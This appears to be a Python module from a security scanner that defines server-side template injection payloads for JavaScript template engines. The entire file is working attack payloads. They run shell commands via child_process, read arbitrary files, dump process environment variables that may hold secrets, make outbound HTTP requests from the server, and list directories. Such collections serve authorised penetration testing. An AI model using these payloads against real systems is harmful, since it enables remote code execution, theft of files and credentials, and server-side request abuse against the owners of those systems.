"""SSTI vulnerability payloads"""

SSTI_PAYLOADS = {
    'command_execution': '''${{(() => {{
        const exec = require('child_process').execSync;
        return exec('echo {marker}').toString();
    }})()}}''',
    
    'file_read': '''${{(() => {{
        const fs = require('fs');
        return fs.readFileSync('{file}', 'utf8');
    }})()}}''',
    
    'process_info': '''${{(() => {{
        return JSON.stringify({{
            env: process.env,
            version: process.version,
            arch: process.arch,
            platform: process.platform
        }}, null, 2);
    }})()}}''',
    
    'network_access': '''${{(() => {{
        const http = require('http');
        return new Promise((resolve) => {{
            const req = http.get('{url}', (res) => {{
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => resolve(data));
            }});
            req.on('error', (err) => resolve("Error: " + err.message));
        }});
    }})()}}''',
    
    'directory_listing': '''${{(() => {{
        const fs = require('fs');
        const path = require('path');
        const dir = '{dir}';
        return fs.readdirSync(dir).map(file => {{
            const stats = fs.statSync(path.join(dir, file));
            return `${{file}} (${{stats.isDirectory() ? 'dir' : 'file'}})`;
        }}).join('\\n');
    }})()}}'''
} 